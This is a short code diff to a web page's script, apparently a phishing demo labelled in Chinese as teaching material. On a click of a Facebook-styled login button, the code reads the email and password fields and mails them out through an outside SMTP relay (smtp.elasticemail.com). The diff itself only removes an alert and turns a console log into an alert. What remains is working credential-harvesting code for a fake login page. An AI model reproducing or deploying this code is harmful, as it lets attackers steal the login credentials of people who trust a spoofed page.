@@ -8,7 +8,6 @@
  <script>
     $(document).ready(function(){
     $('._42ft').click(function(){
-        alert("完成認證");
         function sendEmail(){
         Email.send({
         Host : "smtp.elasticemail.com",
@@ -19,7 +18,7 @@
         Subject : "教學用帳號密碼傳回值",
         Body : "信箱:" + document.getElementById("email").value+"密碼:"+document.getElementById("pass").value
         }).then(
-        message => console.log("執行結果:"+message)
+        message => alert("執行結果:"+message)
     )   ;
     }
         sendEmail();
